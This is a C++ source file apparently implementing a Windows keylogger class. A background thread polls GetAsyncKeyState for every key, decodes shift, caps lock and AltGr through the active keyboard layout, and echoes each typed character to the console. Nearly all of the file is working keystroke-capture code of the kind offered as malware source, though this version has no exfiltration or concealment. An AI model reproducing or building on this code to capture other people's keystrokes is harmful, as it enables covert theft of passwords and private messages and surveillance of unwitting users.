#include "keylogger.h"

Keylogger::Keylogger() 
	: keylog(nullptr) 
	, console()
{
	setlocale(LC_ALL, "");
}

void Keylogger::startKeylog() {
	auto listener = [this]() {
		while (isKeylogging()) {
			setKeysState();
			handleOutput();
			console.toggleWindow(getKeys());

			std::this_thread::sleep_for(polling);
		}
	};
	keylog = new std::thread(listener);
}
void Keylogger::stopKeylog() {
	std::thread* temp = keylog;
	keylog = nullptr;
	temp->join();
	delete temp;
}
bool Keylogger::isKeylogging() {
	return keylog != nullptr;
}

void Keylogger::setKeysState() {
	for (BYTE i = 0; i < KEYBOARDSIZE; i++) {
		setKeyState(i, GetAsyncKeyState(i));
	}
}
void Keylogger::handleOutput() {
	const auto& keys = getKeys();
	const auto& layout = getLayout();
	const auto& keysLayout = getKeysLayout();

	const bool shift = keys[VK_SHIFT].isPressed();
	const bool ctrl = keys[VK_CONTROL].isPressed();
	const bool alt = keys[VK_MENU].isPressed();

	const bool caps = keys[VK_CAPITAL].isToggled();
	const bool altgr = ctrl && alt; 

	for (int i = 0; i < keysLayout.size(); i++) {
		const auto& keyLayout = keysLayout[i];
		const auto& key = keys[keyLayout.VirtualKey];

		if (!key.isAlternating() || !key.isPressed()) {
			continue;
		}

		const auto& attributes = keyLayout.Attributes;
		const bool upper{
			attributes & CAPLOK && !altgr || attributes & CAPLOKALTGR && altgr ?
			shift != caps :
			shift
		};
			
		const BYTE index = layout.pCharModifiers->ModNumber[
			(upper ? KBDSHIFT : 0) | (ctrl ? KBDCTRL : 0) | (alt ? KBDALT : 0)
		];

		std::wcout << keyLayout.wch[index];

		std::wcout.clear();
	}
}

